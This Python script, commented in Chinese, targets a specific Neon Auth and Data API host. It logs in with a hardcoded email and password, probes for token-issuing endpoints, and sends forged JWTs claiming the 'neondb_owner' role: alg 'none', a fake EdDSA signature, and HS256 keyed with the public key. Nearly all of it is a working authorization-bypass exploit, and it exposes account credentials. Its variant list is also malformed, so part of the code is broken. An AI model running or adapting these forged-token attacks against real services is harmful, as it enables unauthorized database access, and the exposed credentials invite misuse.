# -*- coding: utf-8 -*-
"""找 Data API JWT 签发端点:session token 直用 + Auth 端点枚举 + kid 伪造矩阵"""
import http.client, ssl, json, time, base64, hmac, hashlib

ctx = ssl.create_default_context()
NA = 'ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build'
DA_HOST = 'ep-crimson-fog-w2gucld1.apirest.us-east-2.aws.neon.build'
DA_BASE = '/neondb/rest/v1'
EMAIL = 'libobo1229+na2@gmail.com'
PWD = 'SecTest!2026pass2'
KID = '6ab964bf-eee3-4249-bac3-85adf9d5faee'
KEY_X = 'T2bvRniQ-dVtriL1EY22pby24AQVsi22hGWV8i4aYtY'

def req(host, method, path, body=None, token=None, headers=None, origin=None):
    conn = http.client.HTTPSConnection(host, context=ctx, timeout=20)
    h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json', 'Content-Type': 'application/json'}
    if origin:
        h['Origin'] = origin
    if token:
        h['Authorization'] = 'Bearer ' + token
    if headers:
        h.update(headers)
    conn.request(method, path, body=json.dumps(body).encode() if body is not None else None, headers=h)
    r = conn.getresponse()
    raw = r.read()
    st = r.status
    cookies = r.headers.get_all('Set-Cookie') if r.headers else None
    conn.close()
    return st, raw, cookies

# 1) 登录拿 session
st, raw, cookies = req(NA, 'POST', '/neondb/auth/sign-in/email', {'email': EMAIL, 'password': PWD}, origin='http://localhost:3000')
print('[sign-in] %d' % st)
sess_tok = None
try:
    sess_tok = json.loads(raw).get('token')
except Exception:
    pass
if not sess_tok and cookies:
    for c in cookies:
        if 'session_token' in c:
            sess_tok = c.split('=')[1].split(';')[0]
            break
print('session token: %s...' % (sess_tok[:30] if sess_tok else None))

# 2) session token 直接给 Data API
if sess_tok:
    st, raw, _ = req(DA_HOST, 'GET', DA_BASE + '/', token=sess_tok)
    print('\n[DA with session token] -> %d | %s' % (st, raw.decode(errors='replace')[:200]))

# 3) Auth JWT 端点枚举(登录后带 session token)
if sess_tok:
    print('\n=== Auth JWT 端点枚举 ===')
    for p in ('/neondb/auth/token', '/neondb/auth/jwt', '/neondb/auth/session',
              '/neondb/auth/exchange-token', '/neondb/auth/get-token', '/neondb/auth/token/exchange',
              '/neondb/auth/data-api/token', '/neondb/auth/data-api/jwt'):
        st, raw, _ = req(NA, 'GET', p, token=sess_tok, origin='http://localhost:3000')
        body = raw.decode(errors='replace')
        print('  GET %s -> %d | %s' % (p, st, body[:130]))
        if st == 405:
            st2, raw2, _ = req(NA, 'POST', p, body={}, token=sess_tok, origin='http://localhost:3000')
            print('     POST -> %d | %s' % (st2, raw2.decode(errors='replace')[:130]))
        time.sleep(0.3)

# 4) kid + alg 伪造矩阵(直接打 Data API)
print('\n=== kid+alg 矩阵(role=neondb_owner) ===')
now = int(time.time())
def b64e(d):
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def make_jwt(header, payload, sig=b''):
    h = b64e(json.dumps(header).encode())
    p = b64e(json.dumps(payload).encode())
    return h + '.' + p + '.' + (b64e(sig) if sig else '')

pl = {'role': 'neondb_owner', 'exp': now + 3600, 'iat': now}
# 公钥原始字节
key_raw = base64.urlsafe_b64decode(KEY_X + '=' * (-len(KEY_X) % 4))
variants = [
    ('EdDSA 真kid 假签名', make_jwt({'alg': 'EdDSA', 'kid': KID}, pl, b'F' * 64)),
    ('none 带kid', make_jwt({'alg': 'none', 'kid': KID}, pl), None),
    ('HS256 kid 公钥字符串', make_jwt({'alg': 'HS256', 'kid': KID}, pl, hmac.new(KEY_X.encode(), b'', hashlib.sha256).digest()), None),
]
# HS256 需要完整计算,单独处理
for tag, tok, _ in variants:
    if tag == 'HS256 kid 公钥字符串':
        h = b64e(json.dumps({'alg': 'HS256', 'kid': KID}).encode())
        p = b64e(json.dumps(pl).encode())
        tok = h + '.' + p + '.' + b64e(hmac.new(KEY_X.encode(), (h + '.' + p).encode(), hashlib.sha256).digest())
    st, raw, _ = req(DA_HOST, 'GET', DA_BASE + '/', token=tok)
    print('  [%s] -> %d | %s' % (tag, st, raw.decode(errors='replace')[:160]))
